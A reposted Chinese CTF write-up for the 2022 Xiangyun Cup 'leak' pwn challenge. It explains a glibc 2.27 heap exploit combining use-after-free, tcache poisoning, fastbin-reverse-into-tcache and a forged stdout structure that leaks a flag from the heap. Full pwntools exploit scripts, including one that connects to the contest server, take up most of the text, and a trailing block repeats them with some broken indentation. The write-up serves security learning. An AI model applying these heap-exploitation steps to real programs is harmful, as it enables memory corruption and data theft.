# 祥云杯2022-leak Writeup

> 原文: https://www.ctfiot.com/80771.html
> ID: 80771

祥云杯做到一道出的还挺好的题目，而且学了较多的利用思路，特此记录。leak.zip（https://xia0ji233.pro/2022/10/31/XYcup2022/leak.zip）

一

文件分析

这一题呢，是一道经典的 2.27 1.6 版本的堆题，实现了增删改的功能，没有查，4，5两个选项目测是摆设，在题目的一开始，把 flag 的内容读到了堆上，delete 操作存在 uaf 漏洞

二

思路分析

这题它主要是没有 IO 函数，所以 IO 结构体一直没有初始化。但是这里小知识点来了：我们只要把 stdout 的 flag 设置为 0xfbad1800，然后再 exit，它就会输出 IO_write_base 到 IO_write_ptr 俩指针中间的内容，并且它是逐字节打印的，只有尝试打印不可读的内存的时候才会崩溃，只要 IO_write_base 往后还有可读内存，它就一定能打印这些信息。

这个知识其实是 IO 里面的，是当时 fmyy 师傅给我的提示，于是我们的思路就是构造合理的 IO 结构体，然后 IO_write_base 改成 堆的地址，flag 和 IO_write_ptr 改成合理的内范围就可以泄露堆上面的内容了，如图所示：

所以我们的思路是要往 IO 这里写一个堆地址，然后可能还需要再劫持一个指针过去能任意写，至少需要 0x30 的写空间。

然后其实就是写堆地址比较困难了，因为我们根本没有办法泄露堆地址，所以需要用其它的思路，这里肥猫师傅给我的思路就是 fastbin reverse into tcache，当然还有其它的不过我得先学学。

这个利用手法就是需要存在 uaf。然后我们在构造一个 fastbin，将 fastbin 的 fd 改成 target，再把 tcache 中对应大小的堆块数量改得小于7，我们此时再申请一个这个大小的 fast bin就能直接将堆的地址写到 target + 0x18 的位置处。

这里我们可以分析一下它的行为：

因为 glibc 认为 fastbin 中如果还有数据且 tcache 数据不满的情况，我们就会将 fastbin 中剩下的数据取出放入 tcache 当中。这里还需要注意，这个版本的 tcache 已经有了两个字段，它已经变成了双链表，检查也更多了，没有之前那么脆弱，但是需要用到这个利用，还得它是双链表，单链表用不起来的。

那么这个 tcache 对应的 bin 每个 size 都有一个 fd 和 bk。而我们 fastbin 链入 tcache 大概就是：

fastbin->fd=tcache[size]->fdfastbin->bk=&tcache[size]tcache[size]->fd=fastbin

那么我们看到这里有一个行为是 fastbin->bk=&tcache[size]。而在 2.27 1.4版本以前（不包括）是没有这句话的，因为它tcache 都没有 bk 指针。所以这里我们可以任意写一个堆地址，这就是 fastbin reverse into tcache 的利用思路。

这里 uaf 并不能直接 double free，因为这个版本开始检测了 double free，并且是遍历检测，他只要在 tcache 中发现有相同的指针直接给你输出一句 corruption。

但是这里我们能 add 的次数是有限的，所以本着非必要不 add 的原则我们还是能省则省。

我们先构造一个 unsorted bin，然后利用堆重叠的思路，在上面构造两个 size 的 bin，一个只需要用 tcache 即可，还有一个要构造出 fastbin才行。

我们先布局一下：

交互函数：

def choice(ch):
    p.sendlineafter(b'Your choice: ',str(ch))
def Index(index):
    p.sendlineafter(b'Index: ',str(index))
def INDEX(index):
    p.sendlineafter(b'index: ',str(index))
 
def add(index,size):
    choice(1)
    Index(index)
    p.sendlineafter(b'Size: ',str(size))
 
def edit(index,content):
    choice(2)
    Index(index)
    p.sendafter(b'Content: ',content)
 
def de(index1,index2):
    choice(4)
    INDEX(index1)
    INDEX(index2)
 
def free(index):
    choice(3)
    Index(index)

构造 0 1 两个 chunk 互刷，填满 tcache。

再用 1，2 两个 chunk 去 free 得到两个 fastbin，这里应该用一个就可以了的。。因为我们 fast bin 后面 fd 可以伪造。

add(1,0x30)
add(4,0x20)
add(2,0x30)
for i in range(3):
free(0)
edit(0,p64(0))
free(1)
edit(1,p64(0))

free(0)
edit(0,p64(0))
free(1)
free(2)

我们主要就是针对这个 340 的堆块进行堆重叠。

也就是图中的 fastbin。

然后我们 tcache 劫持一个 堆块到 340 的位置方便我们修改这个 size。这个时候我们需要提前布局好，我们改成 unsorted bin 之后会有多大，下面我们再分配一个 0x90 的堆块和这个一加起来就是 0xd0。所以unsorted bin 我们伪造 0xd0。

因为 fastbin 的存在会触发 malloc_consolidate 函数，所以我们这里删除了 fastbin，等接下来再构造。

add(0,0x30)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for  i in range(3):
    free(0)
    edit(0,p64(0))
    free(1)
    edit(1,p64(0))
 
free(0)
edit(0,p64(0))
 
add(3,0x90)
add(5,0x20)
add(8,0xd0)
add(9,0x50)
 
free(4)
free(5)
edit(5,'\x40')

后面再进行一次布局，然后 uaf 改指针的低位为 x40 字节。

此时一个 tcache chunk 的 fd 指向了我们要伪造的堆块的地址。

再把两个堆块取出来，然后取出的第二个堆块就是我们重叠的 可以改 size 的块。

add(0,0x30)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for  i in range(3):
    free(0)
    edit(0,p64(0))
    free(1)
    edit(1,p64(0))
 
free(0)
edit(0,p64(0))
 
add(3,0x90)
add(5,0x20)
add(8,0xd0)
add(9,0x50)
 
free(4)
free(5)
edit(5,'\x40')
 
add(6,0x20)
add(7,0x20)
edit(7,p64(0x6161616161616161)+p64(0x41))
 
free(1)
free(2)
edit(7,p64(0x65656565)+p64(0x61))
 
free(9)
free(2)
 
edit(7,p64(0x65656565)+p64(0xe1))

到这里我们就完成了 tcache 的构造，和 fastbin 的构造。

然后我们就应该这个伪造的 0xe0 的堆块和我们之前布局的一个 0xe0 的堆块互刷产生 unsorted bin，带上 libc 的地址，然后改掉低两个字节去 stdout那边。

add(0,0x30)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for  i in range(3):
    free(0)
    edit(0,p64(0))
    free(1)
    edit(1,p64(0))
 
free(0)
edit(0,p64(0))
 
add(3,0x90)
add(5,0x20)
add(8,0xd0)
add(9,0x50)
 
free(4)
free(5)
edit(5,'\x40')
 
add(6,0x20)
add(7,0x20)
edit(7,p64(0x6161616161616161)+p64(0x41))
 
free(1)
free(2)
edit(7,p64(0x65656565)+p64(0x61))
 
free(9)
free(2)
 
edit(7,p64(0x65656565)+p64(0xe1))
 
for i in range(3):
    free(8)
    edit(8,p64(0))
    free(2)
    edit(2,p64(0))
 
free(8)
edit(8,p64(0))
free(2)
edit(7,p64(0x65656565)+p64(0x41)+b'\x60\xe7')
 
add(11,0x50)
add(10,0x50)
edit(10,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff)

这里用我们伪造的 0x60 的堆块去 stdout 改掉了 flag 和 IO_write_ptr。

最后再把 地址改成 768，也就是 IO_read_ptr 的地址，因为这样的话就会去执行

fastbin->bk=&tcache[size]

的时候就会给 768+0x18（fast bin 的 bk 是在+0x18的位置）的位置写上 tcache bin 的地址。

我们刚刚那个情况的堆块情况是这样的：

然后我们把这个 fd 再改了，然后 add 一个 0x40 的堆块，会把 tcache 中的堆块取出来，tcache bin不为满且 tcache bin 的指针为 NULL。我们再次取 0x40 的堆块就会取 fastbin，然后判断 fastbin 不为空，把这个 340 堆块的 fd 当作 fastbin 放入 tcache 当中，触发 fastbin reverse into tcache，在 IO_write_base 上写入地址。

最后我们成功构造出 IO 结构体。

然后选择选项 6 exit输出一大堆内容，我们直接用终端的搜索可以找到 flag，这里需要爆破 半个字节去找到 stdout。

来看看冤种选手赛后出题。

三

比赛感想

真的我太冤种了，赛时不看题，赛后两小时出题，我因为看错版本，浪费 4 个小时，以为是 1.2 版本的可以 double free 的，并且 2.27 1.2版本因为没有 bk 指针无法进行 fastbin reverse into tcache，因此否定了一开始正确的思路，并且我一开始的构造堆块的时候。我的想法是分配两个指针在 stdout，然后一个指针在前伪造 size，另一个指针被 free fd带上了堆块地址，然后稍微把堆块地址改小点就也可以泄露。并且 2.27 1.2 版本的exp都写好了，结果突然发现是 1.6 版本的，最关键是我们队多我这一题就能进决赛了，太可惜了！检讨：做题一定要看题目版本，就像考试一定要先检查答卷，下次不要犯这种错误了。

也把1.2版本的exp扔出来给师傅们学习一下这个思路。

from pwn import *
#context.log_level='debug'
file='./leak'
elf=ELF(file)
libc=ELF('./libc/libc-2.27-64.so')
p=process(file)
 
def choice(ch):
    p.sendlineafter(b'Your choice: ',str(ch))
def Index(index):
    p.sendlineafter(b'Index: ',str(index))
def INDEX(index):
    p.sendlineafter(b'index: ',str(index))
 
def add(index,size):
    choice(1)
    Index(index)
    p.sendlineafter(b'Size: ',str(size))
 
def edit(index,content):
    choice(2)
    Index(index)
    p.sendafter(b'Content: ',content)
 
def de(index1,index2):
    choice(4)
    INDEX(index1)
    INDEX(index2)
 
def free(index):
    choice(3)
    Index(index)
 
 
add(7,0x20)
add(8,0x20)
add(9,0x90)
add(0,0x90)
 
add(1,0x10)
free(7)
free(8)
 
for i in range(3):
    free(0)
    edit(0,p64(0)*2)
    free(9)
    edit(9,p64(0)*2)
 
free(0)
#edit(0,p64(0)*2)
 
free(9)
 
edit(0,'\x00')
#edit(0,'\x60\xe7')
add(2,0x90)
add(10,0x90)
gdb.attach(p)
add(3,0x90)
 
 
edit(3,p64(0xfbad1800))
 
edit(0,'\xa0\xdc')
 
add(4,0x90)
free(4)
edit(4,p64(0))
 
free(0)
edit(0,'\x80\xe7')
 
add(5,0x90)
add(6,0x90)
 
edit(3,p64(0)*2+p64(0xfbad1800)+p64(0)*2+p64(0x31)*2+p64(0x5fffffffffff))
free(6)
edit(3,p64(0)*2+p64(0xfbad1800)+p64(0)*2+p64(0x31)+b'\x00')
choice(6)
 
 
#flag=p.recvuntil('}')
#print(flag[-40:])
 
 
p.interactive()

看雪ID：xi@0ji233

https://bbs.pediy.com/user-home-919002.htm

*本文由看雪论坛 xi@0ji233 原创，转载请注明来自看雪社区

# 往期推荐

1.CVE-2022-21882提权漏洞学习笔记

2.wibu证书 – 初探

3.win10 1909逆向之APIC中断和实验

4.EMET下EAF机制分析以及模拟实现

5.sql注入学习分享

6.V8 Array.prototype.concat函数出现过的issues和他们的POC们

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
fastbin->fd=tcache[size]->fdfastbin->bk=&tcache[size]tcache[size]->fd=fastbin
def choice(ch):
    p.sendlineafter(b'Your choice: ',str(ch))
def Index(index):
    p.sendlineafter(b'Index: ',str(index))
def INDEX(index):
    p.sendlineafter(b'index: ',str(index))
 
def add(index,size):
    choice(1)
    Index(index)
    p.sendlineafter(b'Size: ',str(size))
 
def edit(index,content):
    choice(2)
    Index(index)
    p.sendafter(b'Content: ',content)
 
def de(index1,index2):
    choice(4)
    INDEX(index1)
    INDEX(index2)
 
def free(index):
    choice(3)
    Index(index)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for i in range(3):
free(0)
edit(0,p64(0))
free(1)
edit(1,p64(0))

free(0)
edit(0,p64(0))
free(1)
free(2)
add(0,0x30)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for  i in range(3):
    free(0)
    edit(0,p64(0))
    free(1)
    edit(1,p64(0))
 
free(0)
edit(0,p64(0))
 
add(3,0x90)
add(5,0x20)
add(8,0xd0)
add(9,0x50)
 
free(4)
free(5)
edit(5,'\x40')
add(0,0x30)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for  i in range(3):
    free(0)
    edit(0,p64(0))
    free(1)
    edit(1,p64(0))
 
free(0)
edit(0,p64(0))
 
add(3,0x90)
add(5,0x20)
add(8,0xd0)
add(9,0x50)
 
free(4)
free(5)
edit(5,'\x40')
 
add(6,0x20)
add(7,0x20)
edit(7,p64(0x6161616161616161)+p64(0x41))
 
free(1)
free(2)
edit(7,p64(0x65656565)+p64(0x61))
 
free(9)
free(2)
 
edit(7,p64(0x65656565)+p64(0xe1))
add(0,0x30)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for  i in range(3):
    free(0)
    edit(0,p64(0))
    free(1)
    edit(1,p64(0))
 
free(0)
edit(0,p64(0))
 
add(3,0x90)
add(5,0x20)
add(8,0xd0)
add(9,0x50)
 
free(4)
free(5)
edit(5,'\x40')
 
add(6,0x20)
add(7,0x20)
edit(7,p64(0x6161616161616161)+p64(0x41))
 
free(1)
free(2)
edit(7,p64(0x65656565)+p64(0x61))
 
free(9)
free(2)
 
edit(7,p64(0x65656565)+p64(0xe1))
 
for i in range(3):
    free(8)
    edit(8,p64(0))
    free(2)
    edit(2,p64(0))
 
free(8)
edit(8,p64(0))
free(2)
edit(7,p64(0x65656565)+p64(0x41)+b'\x60\xe7')
 
add(11,0x50)
add(10,0x50)
edit(10,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff)
fastbin->bk=&tcache[size]
from pwn import *
context.log_level='debug'
file='./leak'
elf=ELF(file)
libc=ELF('./libc/libc-2.27-64.so')
    #p=process(file)
def pwn():
    p=remote('101.201.71.136', 20783)
    def choice(ch):
        p.sendlineafter(b'Your choice: ',str(ch))
    def Index(index):
        p.sendlineafter(b'Index: ',str(index))
    def INDEX(index):
        p.sendlineafter(b'index: ',str(index))
 
    def add(index,size):
        choice(1)
        Index(index)
        p.sendlineafter(b'Size: ',str(size))
 
    def edit(index,content):
        choice(2)
        Index(index)
        p.sendafter(b'Content: ',content)
 
    def de(index1,index2):
        choice(4)
        INDEX(index1)
        INDEX(index2)
 
    def free(index):
        choice(3)
        Index(index)
 
    add(0,0x30)
    add(1,0x30)
    add(4,0x20)
    add(2,0x30)
    for  i in range(3):
        free(0)
        edit(0,p64(0))
        free(1)
        edit(1,p64(0))
 
    free(0)
    edit(0,p64(0))
    #free(1)
    #free(2)
 
    add(3,0x90)
    add(5,0x20)
    add(8,0xd0)
    add(9,0x50)
 
    free(4)
    free(5)
    edit(5,'\x40')
 
    add(6,0x20)
    add(7,0x20)
    edit(7,p64(0x6161616161616161)+p64(0x41))
    free(1)
    free(2)
    edit(7,p64(0x65656565)+p64(0x61))
 
 
    free(9)
    free(2)
 
    edit(7,p64(0x65656565)+p64(0xe1))
    for i in range(3):
        free(8)
        edit(8,p64(0))
        free(2)
        edit(2,p64(0))
 
    free(8)
    edit(8,p64(0))
    free(2)
    edit(7,p64(0x65656565)+p64(0x41)+b'\x60\xe7')
 
    add(11,0x50)
    add(10,0x50)
    edit(10,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff))
 
    edit(2,'\x68\xe7')
    add(12,0x30)
    add(13,0x30)
    #gdb.attach(p)
 
    p.interactive()
while True:  
    try:
        pwn()
    
except:
        continue
    break
from pwn import *
    #context.log_level='debug'
file='./leak'
elf=ELF(file)
libc=ELF('./libc/libc-2.27-64.so')
p=process(file)
 
def choice(ch):
    p.sendlineafter(b'Your choice: ',str(ch))
def Index(index):
    p.sendlineafter(b'Index: ',str(index))
def INDEX(index):
    p.sendlineafter(b'index: ',str(index))
 
def add(index,size):
    choice(1)
    Index(index)
    p.sendlineafter(b'Size: ',str(size))
 
def edit(index,content):
    choice(2)
    Index(index)
    p.sendafter(b'Content: ',content)
 
def de(index1,index2):
    choice(4)
    INDEX(index1)
    INDEX(index2)
 
def free(index):
    choice(3)
    Index(index)
 
 
add(7,0x20)
add(8,0x20)
add(9,0x90)
add(0,0x90)
 
add(1,0x10)
free(7)
free(8)
 
for i in range(3):
    free(0)
    edit(0,p64(0)*2)
    free(9)
    edit(9,p64(0)*2)
 
free(0)
    #edit(0,p64(0)*2)
 
free(9)
 
edit(0,'\x00')
    #edit(0,'\x60\xe7')
add(2,0x90)
add(10,0x90)
gdb.attach(p)
add(3,0x90)
 
 
edit(3,p64(0xfbad1800))
 
edit(0,'\xa0\xdc')
 
add(4,0x90)
free(4)
edit(4,p64(0))
 
free(0)
edit(0,'\x80\xe7')
 
add(5,0x90)
add(6,0x90)
 
edit(3,p64(0)*2+p64(0xfbad1800)+p64(0)*2+p64(0x31)*2+p64(0x5fffffffffff))
free(6)
edit(3,p64(0)*2+p64(0xfbad1800)+p64(0)*2+p64(0x31)+b'\x00')
choice(6)
 
 
    #flag=p.recvuntil('}')
    #print(flag[-40:])
 
 
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1669543374.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1669543375.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1669543375.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669543376.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669543377.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1669543381.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1669543382.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1669543383.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1669543383.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669543384.png)